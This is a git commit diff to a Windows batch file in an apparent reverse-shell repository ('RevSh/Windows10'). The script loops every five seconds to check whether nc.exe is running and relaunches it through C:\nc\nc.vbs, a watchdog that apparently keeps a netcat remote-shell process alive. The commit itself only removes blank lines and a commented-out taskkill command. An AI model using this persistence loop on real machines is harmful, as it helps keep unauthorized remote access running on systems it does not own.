e6d2c7701629117fc32bcdeb42558de11ebe31a9
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-10-18 18:02:46 +0000

    Update nc.bat

--- RevSh/Windows10/nc.bat
+++ RevSh/Windows10/nc.bat
@@ -1,6 +1,5 @@
 @echo off
 title nc
-
 :LOOP
 timeout 5
 SET MyProcess=nc.exe
@@ -8,10 +7,6 @@ ECHO "%MyProcess%"
 TASKLIST | FINDSTR /I "%MyProcess%"
 IF ERRORLEVEL 1 (GOTO :START) ELSE (ECHO "%MyProcess%" is currently running)
 GOTO :LOOP
-
 :START
-REM taskkill /F /IM cmd.exe /FI "WINDOWTITLE ne nc*"
 start C:\nc\nc.vbs
-
-
 goto LOOP
